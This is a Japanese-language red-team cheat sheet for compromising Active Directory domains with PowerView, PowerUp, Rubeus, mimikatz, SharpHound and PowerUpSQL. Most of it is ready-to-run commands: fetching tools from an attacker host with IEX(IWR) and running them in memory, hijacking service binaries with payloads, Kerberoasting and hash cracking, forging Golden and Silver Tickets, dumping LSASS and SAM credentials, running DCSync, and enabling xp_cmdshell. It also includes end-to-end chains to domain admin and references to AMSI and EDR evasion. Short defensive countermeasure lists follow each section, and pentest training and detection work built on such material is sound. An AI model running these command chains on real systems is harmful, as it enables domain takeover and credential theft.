01PowerView.ps1AD 列挙の基本

PowerShell ベースの AD オブジェクト列挙ツール。ドメイン情報・ユーザ・グループ・コンピュータ・ACL の一通りをカバーする。Get-Domain* / Find-* 系関数が中心。

導入・実行準備

powershell
# メモリロード
IEX(IWR -UseBasicParsing "http://<LHOST>:8080/PowerView.ps1")

# またはローカルドットソース
. .\PowerView.ps1

# AMSI 有効環境では事前バイパスが必要（詳細は evasion sheet 参照）
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

ドメイン基本情報

powershell
Get-Domain
Get-Forest
Get-DomainController
Get-DomainTrust

ユーザ列挙

powershell
# 全ドメインユーザ
Get-DomainUser | Select-Object samaccountname, displayname, lastlogon

# 特定グループのメンバ
Get-DomainUser -MemberOf "Domain Admins" | Select-Object samaccountname

# 特定ユーザの詳細
Get-DomainUser -Identity "alice" -Properties *

# Kerberoasting 対象（SPN 付きユーザ）
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalnames

# AS-REP Roasting 対象（プリ認証無効ユーザ）
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# 直近30日のログオンユーザ
Get-DomainUser -Properties lastlogon | Where-Object {$_.lastlogon -gt [datetime]::Now.AddDays(-30)} | Select-Object samaccountname, lastlogon

グループ列挙

powershell
Get-DomainGroup | Select-Object samaccountname, description
Get-DomainGroup "*admin*" | Select-Object samaccountname, members
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object membername

# ネスト評価込みの所属
Get-DomainGroup -MemberIdentity "alice" | Select-Object samaccountname

コンピュータ列挙

powershell
Get-DomainComputer | Select-Object samaccountname, operatingsystem, lastlogontimestamp

# Server OS のみ
Get-DomainComputer -OperatingSystem "*Server*" | Select-Object samaccountname, operatingsystem

# Unconstrained Delegation ホスト（横展開の起点になる）
Get-DomainComputer -Unconstrained | Select-Object samaccountname

# Constrained Delegation ホスト
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

ACL・権限調査

powershell
# 特定オブジェクトの ACL
Get-ObjectAcl -SamAccountName "alice" -ResolveGUIDs | Select-Object ObjectAceType, ActiveDirectoryRights, SecurityIdentifier

# GenericAll / WriteProperty を持つ ACE を横串で抽出
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteProperty*"}
防御 / countermeasures
  • Script Block Logging (Event ID 4104) と PowerShell Module Logging を有効化し、Get-Domain* / Find-InterestingDomainAcl のパターン検知を導入する。
  • Constrained Language Mode (CLM) を AppLocker / WDAC で強制。PowerView は Full Language Mode を要求するため、CLM 下では機能不全となる。
  • LDAP クエリの高頻度発生（同一プリンシパルから短時間の広範囲列挙）を SIEM でベースライン化する。

02PowerUp.ps1ローカル権限昇格

PowerSploit 系のローカル misconfiguration スキャナ。Unquoted service path、書き込み可能サービスバイナリ、レジストリ、DLL hijack 候補を一括で洗い出す。

導入・全体スキャン

powershell
IEX(IWR -UseBasicParsing "http://<LHOST>:8080/PowerUp.ps1")

# 全チェック一括
Invoke-AllChecks

# 個別チェック
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Find-PathDLLHijack

サービス系脆弱性

powershell
# Unquoted Service Path — 悪用
# 例: PathName = C:\Program Files\Vuln App\service.exe（引用符なし）
Copy-Item .\payload.exe "C:\Program Files\Vuln.exe"

# 書き込み可能サービスバイナリ — 悪用
Copy-Item .\payload.exe "C:\Services\mod.exe" -Force
Restart-Service ModService

# 書き込み可能サービス設定 — 悪用
sc.exe config WeakService binpath="C:\Windows\Tasks\payload.exe"
sc.exe start WeakService

レジストリ・DLL 系

powershell
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Find-PathDLLHijack
防御 / countermeasures
  • サービス実行ファイルパスは必ず引用符付きで登録し、書き込み権限は SYSTEM/Administrators に限定する。
  • AlwaysInstallElevated は無効化。有効化されたレジストリキー (HKLM/HKCU) の変更を監視する。
  • %PATH% に書き込み可能ディレクトリが含まれていないか GPO で監査。DLL hijack の起点になる。

03Rubeus.exeKerberos 攻撃

Kerberos 攻撃の万能ツール。AS-REP Roasting / Kerberoasting / S4U (constrained delegation) / Golden・Silver Ticket / TGT 抽出まで一通り。

基本操作

cmd
REM 現在のチケット
.\Rubeus.exe klist

REM 全 LUID のチケット（SYSTEM 権限）
.\Rubeus.exe klist /all

AS-REP Roasting

cmd
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe asreproast /user:bob /format:hashcat
bash
# hashcat mode 18200
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

Kerberoasting

cmd
.\Rubeus.exe kerberoast /format:hashcat /outfile:tgs.txt
.\Rubeus.exe kerberoast /spn:MSSQLSvc/SQL01.contoso.local:1433 /format:hashcat

REM tgtdeleg 経由（RC4 強制でクラック容易化）
.\Rubeus.exe kerberoast /tgtdeleg /format:hashcat
bash
# hashcat mode 13100
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

Constrained Delegation (S4U)

cmd
REM S4U2Self + S4U2Proxy でターゲット SPN の TGS を偽装取得
.\Rubeus.exe s4u /user:SRV01$ /rc4:<RC4_HASH> /impersonateuser:Administrator /msdsspn:cifs/SQL01.contoso.local /ptt

REM altservice で SPN 書き換え（cifs → host/http/ldap 等）
.\Rubeus.exe s4u /user:SRV01$ /rc4:<RC4_HASH> /impersonateuser:Administrator /msdsspn:cifs/SQL01.contoso.local /altservice:host,http,ldap /ptt

REM Kali に持ち出す場合は /nowrap でエクスポート
.\Rubeus.exe s4u /user:SRV01$ /rc4:<RC4_HASH> /impersonateuser:Administrator /msdsspn:cifs/SQL01.contoso.local /nowrap

Golden / Silver Ticket

cmd
REM Golden Ticket（krbtgt ハッシュ必須）
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:contoso.local /sid:S-1-5-21-... /user:admin /ptt

REM Silver Ticket（サービスアカウントのハッシュで対象サービスに限定）
.\Rubeus.exe silver /rc4:<NT_HASH> /domain:contoso.local /sid:S-1-5-21-... /user:admin /service:cifs /target:SQL01.contoso.local /ptt

Unconstrained Delegation

cmd
REM SpoolSample で DC を強制認証させ、Unconstrained ホストに TGT を集める
.\SpoolSample.exe DC01.contoso.local SRV01.contoso.local

REM 取得された DC の TGT を確認
.\Rubeus.exe klist

REM 指定 LUID からエクスポート
.\Rubeus.exe dump /service:krbtgt /luid:0x... /nowrap
防御 / countermeasures
  • Kerberoasting: サービスアカウントは msDS-ManagedPasswordInterval による gMSA 化。パスワードは 25 文字以上のランダム化で辞書攻撃を無効化。
  • AS-REP Roasting: DONT_REQ_PREAUTH フラグを持つアカウントを棚卸し、原則 0 件を維持する。
  • Unconstrained Delegation: DC 以外での有効化を禁止。Protected Users グループ・Account is sensitive and cannot be delegated フラグを高特権アカウントに設定する。
  • Kerberos 4769 / 4768 の Ticket Encryption Type = 0x17 (RC4) を優先的にアラート化。AES 強制の環境では RC4 リクエスト自体が異常シグナル。

04mimikatz.exe資格情報抽出

LSASS / LSA Secrets / SAM / DPAPI からの資格情報抽出、PTH / PTT、DCSync、Golden Ticket 生成まで対応。Defender をはじめとする EDR に広く検知されるためロード方法は evasion sheet 参照。

起動

cmd
.\mimikatz.exe

REM バッチモード（出力をファイルへ）
.\mimikatz.exe "sekurlsa::logonpasswords" "exit" > mimi.log

メモリ内資格情報 (LSASS)

text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::credman

LSA Secrets 抽出

text
mimikatz # lsadump::secrets

# 代表的な取得対象
#   DPAPI_SYSTEM           — DPAPI マスターキー復号のトリガ
#   _SC_<ServiceName>      — サービスアカウントの平文パスワード
#   $MACHINE.ACC           — マシンアカウントの NT ハッシュ

SAM データベース

text
mimikatz # lsadump::sam

# 代表出力: ローカル Administrator (RID 500) の NT ハッシュ
#   User : Administrator
#   Hash NTLM: <ADMIN_NT>

Pass-the-Hash / Pass-the-Ticket / DCSync

text
# Pass-the-Hash
mimikatz # sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:<ADMIN_NT> /run:cmd.exe

# Pass-the-Ticket
mimikatz # kerberos::list
mimikatz # kerberos::ptt ticket.kirbi

# DCSync（Replicating Directory Changes 権限を持つプリンシパルで実行）
mimikatz # lsadump::dcsync /domain:contoso.local /user:krbtgt

# Golden Ticket
mimikatz # kerberos::golden /user:admin /domain:contoso.local /sid:S-1-5-21-... /krbtgt:<KRBTGT_HASH> /ptt
防御 / countermeasures
  • Credential Guard (VBS) を有効化し、LSASS からの平文・NT ハッシュ・Kerberos キー抽出を封じる。
  • DCSync 検知: Event ID 4662 の Directory Service Access で DS-Replication-Get-Changes-All / -All-Filtered の要求を非 DC / 非同期パートナーからのアクセスとしてアラート化。
  • krbtgt パスワードは定期ローテーション (2 回連続 reset) で Golden Ticket を無効化。
  • Protected Process Light (PPL) を LSASS に適用してユーザモードからのアクセスを制限する。

05SharpHound.exeBloodHound データ収集

AD オブジェクト・ACL・セッションを LDAP と SMB から収集し、BloodHound の攻撃経路グラフに投入する。CollectionMethod の粒度でノイズを制御。

収集実行

powershell
# PowerShell 版
IEX(IWR -UseBasicParsing "http://<LHOST>:8080/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All -Domain contoso.local -ZipFileName recon.zip

# 実行ファイル版
.\SharpHound.exe --CollectionMethods All --Domain contoso.local --ZipFileName recon.zip

# ステルスモード（DC への LDAP のみ、SMB セッション列挙を省略）
.\SharpHound.exe --CollectionMethods DCOnly --Domain contoso.local

収集オプション

cmd
.\SharpHound.exe -c All                              REM 全網羅
.\SharpHound.exe -c DCOnly                           REM DC のみ
.\SharpHound.exe -c All,Session                      REM セッション情報込み
.\SharpHound.exe -c All,CertServices                 REM AD CS テンプレート
.\SharpHound.exe -c All -d contoso.local,child.contoso.local REM 複数ドメイン
.\SharpHound.exe -c All --OU "OU=Servers,DC=contoso,DC=local"

Kali 側での取り込み

bash
# zip 取得
curl -O http://<LHOST>/uploads/YYYYMMDDHHMMSS_recon.zip

# BloodHound 起動
neo4j start
bloodhound

# GUI 側の代表クエリ
#   Find all Domain Admins
#   Shortest Path to High Value Targets
#   Find Principals with DCSync Rights
防御 / countermeasures
  • SMB セッション列挙は Event ID 5145 で網羅的にログ化される。短時間で多数のホストへ IPC$ アクセスするパターンを検知する。
  • Sensitive OU の List Contents ACE を業務プリンシパルから外し、LDAP による無差別列挙を阻害する。
  • Honey user / honey computer を配置し、SharpHound のクエリで参照された時点でアラート化する（BloodHound honeyaccounts）。

06ネイティブ Windows ツールPowerShell 制限環境向け

Constrained Language Mode / AMSI / EDR で PowerShell ツールが使えない環境の代替。net / wmic / dsquery / nltest / RSAT AD モジュールが中心。

net

cmd
net config workstation
net time /domain

net user /domain
net user alice /domain

net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

net localgroup administrators

net view \\DC01.contoso.local
net use \\SQL01\C$ /u:contoso\alice P@ssw0rd123

net use
net session

wmic

cmd

wmic os get Caption,Version,ServicePackMajorVersion

wmic process get Name,ProcessId,CommandLine

wmic useraccount get Name,SID,Disabled
wmic group get Name,SID

wmic startup get Name,Command,Location
wmic product get Name,Version,InstallDate

dsquery / dsget (RSAT)

cmd
dsquery user -name "a*"
dsquery user -inactive 4
dsquery group -name "*admin*"

dsquery computer -inactive 4
dsquery ou

dsget user "CN=alice,CN=Users,DC=contoso,DC=local" -display -email -office
dsget group "CN=Domain Admins,CN=Users,DC=contoso,DC=local" -members

nltest

cmd
nltest /domain_trusts
nltest /domain_trusts /all_trusts
nltest /domain_trusts /v

nltest /dclist:contoso.local
nltest /dsgetdc:contoso.local

PowerShell AD モジュール (RSAT)

powershell
Import-Module ActiveDirectory

Get-ADUser -Filter * -Properties LastLogonDate | Select-Object Name, LastLogonDate
Get-ADUser -Identity "alice" -Properties *

Get-ADGroup -Filter * | Select-Object Name, GroupScope
Get-ADGroupMember -Identity "Domain Admins"

Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate
Get-ADComputer -Filter "OperatingSystem -like '*Server*'"

Get-ADObject -LDAPFilter "(&(objectClass=user)(adminCount=1))"

Get-ADForest
Get-ADDomain
Get-ADDomainController
note RSAT AD モジュールは署名済みかつ AMSI/CLM の対象外ルートで動作するため、PowerView が塞がれた環境の第一選択。ただし取得できる情報粒度は PowerView より粗い（ACE の GUID 解決、SPN 詳細、ネスト評価等は自前で補完が必要）。
防御 / countermeasures
  • net.exe / wmic.exe / nltest.exe はいずれも LOLBAS。プロセス起動監視 (Sysmon Event 1) でコマンドラインの引数パターンから偵察挙動を抽出する。
  • wmic.exe は非推奨化されており、環境から削除する運用が推奨（Windows 11 以降）。

07SQL Server 列挙・攻撃PowerUpSQL / mssqlclient

AD 統合環境の SQL Server は Windows 認証・リンクサーバ・xp_cmdshell を経由して横展開の起点になる。

PowerUpSQL.ps1

powershell
IEX(IWR -UseBasicParsing "http://<LHOST>:8080/PowerUpSQL.ps1")

# SQL Server 発見・接続可能性テスト
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? {$_.Status -eq "Accessible"}

# サーバ情報
Get-SQLInstanceDomain | Get-SQLServerInfo

# データベース・権限
Get-SQLDatabase -Instance "SQL01.contoso.local,1433"
Invoke-SQLAudit -Instance "SQL01.contoso.local"

# リンクサーバ・xp_cmdshell
Get-SQLServerLink -Instance "SQL01.contoso.local"
Invoke-SQLOSCmd -Instance "SQL01.contoso.local" -Command "whoami"
Get-SQLServerLinkCrawl -Instance "SQL01.contoso.local"

mssqlclient.py (impacket)

bash
mssqlclient.py contoso.local/alice:P@ssw0rd123@10.10.10.20

# Windows 認証 (-windows-auth) / TGT 使用 (-k -no-pass) も可
sql
-- 基本列挙
SELECT name FROM sys.databases;
SELECT name FROM sys.server_principals WHERE type = 'S';
SELECT * FROM sys.server_permissions;

-- xp_cmdshell 有効化
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell 'whoami';

-- リンクサーバ経由の実行
SELECT name FROM sys.servers WHERE is_linked = 1;
EXEC('SELECT @@version') AT [SQL02];
EXEC('EXEC xp_cmdshell ''whoami''') AT [SQL03];
防御 / countermeasures
  • SQL Server サービスアカウントは gMSA 化し、SPN 経由の Kerberoasting に耐えるパスワード長を確保する。
  • xp_cmdshell は原則無効化。sp_configure による有効化イベント (Trace/Extended Events) をアラート化する。
  • リンクサーバの認証は "Be made using the login's current security context" ではなく、権限最小の専用ログインを固定指定する（sysadmin を持たないアカウントで）。

08組み合わせ攻撃シナリオchained scenarios

標準的な AD 偵察シーケンス

powershell
# 1. 基本情報
Get-Domain
Get-DomainController
Get-DomainTrust

# 2. ユーザ・グループ
Get-DomainUser | Select-Object samaccountname, description, lastlogon | Sort-Object lastlogon -Descending | Select-Object -First 20
Get-DomainGroup "*admin*"
Get-DomainGroupMember "Domain Admins"

# 3. コンピュータ・SPN
Get-DomainComputer -Properties operatingsystem | Group-Object operatingsystem
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalnames

# 4. Delegation・ACL
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}

# 5. BloodHound 収集
Invoke-BloodHound -CollectionMethod All -ZipFileName recon.zip

Kerberoasting → Pass-the-Hash チェーン

cmd
REM 1. TGS 取得
.\Rubeus.exe kerberoast /format:hashcat /outfile:tgs.txt

REM 2. Kali でクラック
REM   hashcat -m 13100 tgs.txt rockyou.txt

REM 3. クラック済みパスワードで TGT を得る
.\Rubeus.exe asktgt /user:svc_mssql /password:P@ssw0rd123 /ptt

REM 4. 横展開
.\PsExec64.exe \\SQL01.contoso.local cmd

REM 5. 資格情報抽出
.\mimikatz.exe "sekurlsa::logonpasswords" "exit"

Constrained Delegation 経由 DCSync

cmd
REM 1. Delegation 設定確認
Get-DomainComputer SRV01$ -Properties msds-allowedtodelegateto

REM 2. マシンアカウント NT を抽出
.\mimikatz.exe "lsadump::secrets" "exit"

REM 3. S4U で DC 向けチケット取得
.\Rubeus.exe s4u /user:SRV01$ /rc4:<RC4_HASH> /impersonateuser:Administrator /msdsspn:ldap/DC01.contoso.local /ptt

REM 4. DCSync
.\mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt" "exit"

REM 5. Golden Ticket
.\mimikatz.exe "kerberos::golden /user:admin /domain:contoso.local /sid:S-1-5-21-... /krbtgt:<KRBTGT_HASH> /ptt" "exit"
要点 / key takeaways
  • PowerView は AD 偵察の中心。Get-Domain* / Find-InterestingDomainAcl で「誰が何を触れるか」を早期に把握する。
  • Rubeus は Kerberos 攻撃の万能ツール。AS-REP / Kerberoast / S4U / Golden・Silver / Unconstrained まで一貫。
  • ネイティブツール (net / nltest / dsquery) は PowerShell が塞がれた環境の代替として常に選択肢に置く。
  • 組み合わせが本体: 偵察 (PowerView) → 攻撃 (Rubeus) → 資格情報抽出 (mimikatz) → 経路可視化 (BloodHound) の循環で高特権に到達する。
  • SQL Server 環境では PowerUpSQL によるリンクサーバ・xp_cmdshell クロールが有効。AD 統合認証と組み合わせて横展開の一次経路になる。
  • 検知・防御と併記して読む。PowerView / mimikatz / SharpHound は全てシグネチャ・ログ・ETW で観測される。ロード方法・実行方法の選択は evasion sheet を参照。
